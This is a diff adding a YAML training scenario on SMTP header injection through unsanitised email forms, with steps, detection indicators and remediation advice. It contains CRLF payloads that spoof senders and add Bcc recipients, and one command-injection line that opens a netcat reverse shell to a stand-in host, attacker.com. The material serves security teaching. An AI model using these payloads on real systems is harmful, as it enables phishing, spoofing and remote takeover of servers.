@@ -1,0 +1,98 @@
+# Category: Email Security
+name: "SMTP Header Injection – Email Spoofing and Command Injection"
+id: "email-smtp-injection-001"
+category: "email_security"
+subcategory: "smtp"
+difficulty: "intermediate"
+estimated_time: "45 minutes"
+
+description: |
+  Exploit unsanitized user input in email forms to inject SMTP headers,
+  allowing attackers to craft arbitrary emails, spoof sender addresses, and
+  potentially inject commands in vulnerable mail servers. This can lead to
+  phishing, business email compromise, and command injection.
+
+learning_objectives:
+  - Understand SMTP protocol and header structure
+  - Inject CRLF sequences to add additional headers
+  - Spoof sender (From), add BCC recipients, and alter subjects
+  - In some cases, exploit mail server command injection
+
+tools:
+  - curl / netcat
+  - Python (smtplib, smtputil)
+  - Burp Suite
+  - Swaks (command-line SMTP tester)
+
+prerequisites:
+  - Web application with email sending feature (contact form, password reset)
+  - Input is not sanitized for CRLF characters
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify email submission endpoints"
+    commands:
+      - "# Look for forms that send emails (contact, feedback, invite)"
+      - "# Test with input containing CRLF: %0d%0a"
+      - "# Example: test%0d%0aBcc: victim@example.com"
+    expected_output: "Email sent with additional headers"
+    detection: "Mail server logs may show Bcc to unexpected addresses"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject malicious headers to spoof sender"
+    commands:
+      - "# Payload: From%3A attacker%40example%2Ecom"
+      - "# Or inject whole headers: "
+      - 'email=user@example.com%0d%0aFrom: spoofed@example.com%0d%0aSubject: Important'
+    expected_output: "Recipient sees spoofed sender and subject"
+    detection: "Email headers show suspicious Received chain"
+
+  - id: "step3"
+    phase: "advanced"
+    action: "Attempt command injection (if mail server allows)"
+    commands:
+      - "# Inject shell commands in field"
+      - 'email=; nc -e /bin/sh attacker.com 4444'
+    expected_output: "Reverse shell if mailer uses system() without sanitization"
+    detection: "Outbound network connections"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1566.002"
+    description: "Spearphishing Link"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "SMTP traffic with unusual headers"
+  log_indicators:
+    - "Mail server logs with anomalous envelope recipients"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Validate and sanitize all user inputs (remove CRLF)"
+    - "Use a strict allowlist for email fields"
+  long_term:
+    - "Implement DKIM/SPF to detect spoofed emails"
+    - "Use a dedicated email API that escapes headers"
+
+variables:
+  target_endpoint: "https://example.com/contact"
+  malicious_header: "Bcc: victim@example.com"
+
+assessment_questions:
+  - "What is CRLF injection and why is it dangerous in SMTP?"
+  - "How can you test for header injection without affecting actual users?"
+  - "What additional headers can an attacker inject?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/Email_Injection"
+    title: "OWASP Email Injection"
+  - url: "https://www.ietf.org/rfc/rfc2822.txt"
+    title: "RFC 2822 – Internet Message Format"
